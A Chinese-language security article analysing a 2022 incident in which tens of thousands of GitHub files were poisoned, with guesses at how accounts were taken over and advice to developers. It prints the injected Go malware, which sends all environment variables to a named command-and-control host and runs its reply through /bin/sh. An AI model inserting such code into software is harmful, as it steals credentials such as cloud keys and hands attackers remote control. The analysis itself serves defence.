# 事件简述

8月3日13时，名为 Stephen Lacy 的工程师在 Twitter 中表示其发现 GitHub
中大量仓库被加入了恶意代码，感染文件超过3.5万，涉及 Go 代码、NPM 安装脚本、容器镜像配置等内容。

  * 被感染的仓库大多数处在长期不维护的状态，star 和 fork 数量基本为0

  * 恶意代码在最早在2019年已经提交进部分仓库，不少仓库是在最近10天左右被感染

  * 信息收集和控制指令的服务地址位于俄罗斯

15时许，GitHub 开始对受影响仓库进行清理，当前受影响仓库已经全部无法访问。

由于被投毒的开源仓库大多无人关注，预计此次事件本身的实际影响较小，但从攻击手法上来看体现了攻击者有较强的工程化利用能力。

![](https://image.3001.net/images/20220803/1659525811_62ea5ab3a5841a167cac5.png!small)

以`ovz1.j19544519`作为关键词在 GitHub 中可以搜索到超过3.5万个代码文件的结果。

![](https://image.3001.net/images/20220803/1659525824_62ea5ac0808eb0d8fcee0.png!small)

最早提交的恶意代码是在2019年：

<https://github.com/promonlogicalis/asn1/blob/7bdca06d0edf895069dc25fb60a49c6dae27b916/context.go#L241>

![](https://image.3001.net/images/20220803/1659525837_62ea5acd02bd66d268e7e.png!small)

# 攻击手法分析

目前官方暂未给出该事件具体原因，对于此事件涉及众多账号，我们猜想可能存在以下三种情况：

  * GitHub 账号撞库

抽样统计可以发现，多个被投毒的账号密码此前已经泄漏，因此可能通过撞库获得账号权限

![](https://image.3001.net/images/20220803/1659525850_62ea5adacb3adae5ee411.png!small)

  * GitHub API Token 泄漏

攻击者通过收集公开泄漏的 token，从而对仓库进行直接操作。

  * 攻击者注册了一批马甲账号

攻击者可能注册了一批虚假的马甲账号，模仿真实项目，再通过马甲账号发布与原仓库类似的代码。

![](https://image.3001.net/images/20220803/1659525861_62ea5ae549dd83739b1b2.png!small)

# 恶意代码分析

投毒的仓库大多为 go 的仓库，其中恶意代码如下，逻辑本身较为简单。特殊的是除了恶意代码外，攻击者在 commit
中还加入了「逼真」的注释、license、commit 说明等内容，使得恶意代码更容易隐藏。

攻击者可能通过收集原仓库 commit 信息，而后生成与之相似的结果，例如与代码变更相符的 Update README.md 或 Update
license 提交，体现了攻击者有较强的工程化能力。

![](https://image.3001.net/images/20220803/1659525875_62ea5af38b7e017bb1752.png!small)

![](https://image.3001.net/images/20220803/1659525886_62ea5afec7b4574f26e02.png!small)

代码会先尝试获取"e452d6ab"环境变量，如果为"e452d6ab"值为1则直接结束运行。

    
    
    if os__.Getenv("e452d6ab") == "1" {   
    return   
    }

``

如果找不到对应的环境变量则设置"e452d6ab"环境变量，防止重复执行，然后将当前环境的环境变量转为 json 格式的变量 env。

    
    
    os__.Setenv("e452d6ab", "1")   
    env, err := json__.Marshal(os__.Environ())   
    if err != nil {   
    return   
    }

``

再将对应的环境变量发送给恶意服务器，环境变量中可能会包含 AWS access keys，Crypto keys 等敏感内容。

    
    
    res, err := http__.Post("http://ovz1.j19544519.pr46m.vps.myjino.ru:49460/?org=gojek-engineering&repo=go-multierror", "application/json", bytes__.NewBuffer(env))   
    if err != nil {   
    return   
    }

``

最后使用 sh 执行恶意服务器的返回内容，为接下来的远程控制服务器，持久化连接，窃取敏感信息等恶意行为做准备。

    
    
    defer res.Body.Close()   
    body, err := ioutil__.ReadAll(res.Body)   
    if err != nil {   
    return   
    }   
    if string(body) != "" {   
    exec__.Command("/bin/sh", "-c", string(body)).Start()   
    }  
    }

``````恶意代码中的 C&C 地址 ovz1.j19544519.pr46m.vps.myjino.ru，由俄罗斯的一家云服务器厂商 Джино
提供，因此攻击者位于俄罗斯的可能性较高。

# 针对开发者的建议

当前被投毒的仓库已经被 GitHub 官方删除，这些仓库大多无人关注，因此此次事件本身的实际影响较小，开发者在使用开源组件时需要注意甄别。

![](https://image.3001.net/images/20220803/1659525907_62ea5b134f9b970a78d6f.png!small)

从账号安全的角度来看，开发者需要尽量启用多因素验证、避免 API token 的泄漏，防止自己的项目被利用加入恶意代码。

